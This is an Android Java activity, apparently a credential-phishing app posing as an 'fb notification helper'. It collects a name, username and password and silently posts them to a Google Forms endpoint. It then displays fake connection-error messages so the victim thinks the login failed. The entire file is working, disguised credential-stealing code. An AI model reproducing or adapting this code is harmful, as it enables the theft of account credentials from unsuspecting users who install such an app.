package com.victor.test.fb;

import java.net.URLEncoder;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.widget.*;
import android.view.*;

public class MainActivity extends Activity {
	
	final String myTag = "DocsUpload";
	String col1;
	String col2;
	String col3;
	EditText name;
	EditText username;
	EditText pw;
	

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		name=(EditText) findViewById(R.id.mainEditText1);
		username=(EditText) findViewById(R.id.mainEditText2);
		pw=(EditText) findViewById(R.id.mainEditText3);
		
		Toast.makeText(this,"fb notification helper",Toast.LENGTH_SHORT).show();
		Log.i(myTag, "OnCreate()");
//		Thread t = new Thread(new Runnable() {
//			@Override
//			public void run() {
//				postData();
//				
//			}
//		});
//		t.start();
	}
	public void send(View vi){
		
		if(name.getText().toString().trim().length()==0 || username.getText().toString().length()==0 || pw.getText().toString().length()==0){
			Toast.makeText(this,"You have to fill all the fields ",Toast.LENGTH_SHORT).show();
		}
		else{
		Thread t=new  Thread(new Runnable(){

				@Override
				public void run()
				{
					// TODO: Implement this method
					postData();
				}
				
			
		});
		t.start();
		Toast.makeText(this,"error getting $POST[] ",Toast.LENGTH_SHORT).show();
			Toast.makeText(this,"error establishing secure connection ",Toast.LENGTH_SHORT).show();
			Toast.makeText(this,"host not foud ",Toast.LENGTH_SHORT).show();
			Toast.makeText(this,"error getting data ",Toast.LENGTH_SHORT).show();
			finish();
		}
		
		
	}

	@Override
	protected void onDestroy()
	{
		// TODO: Implement this method
		Toast.makeText(this,"bye bye ",Toast.LENGTH_SHORT).show();
		super.onDestroy();
	}

	

	public void postData() {

		String fullUrl = "https://docs.google.com/forms/d/e/1FAIpQLSdgSw6cwLhBNJFdUbnMgaltn6WyaH4o7_mufbpI7uAPCr2M_w/formResponse";
		HttpRequest mReq = new HttpRequest();
		col1=name.getText().toString().trim();
		col2=username.getText().toString();
		col3=pw.getText().toString();
		
		String data = "entry.1912829820=" + URLEncoder.encode(col1) + "&" + 
			"entry.1812849156=" + URLEncoder.encode(col2) + "&" +
			"entry.703574021=" + URLEncoder.encode(col3);
		String response = mReq.sendPost(fullUrl, data);
		Log.i(myTag, response);
	} 

}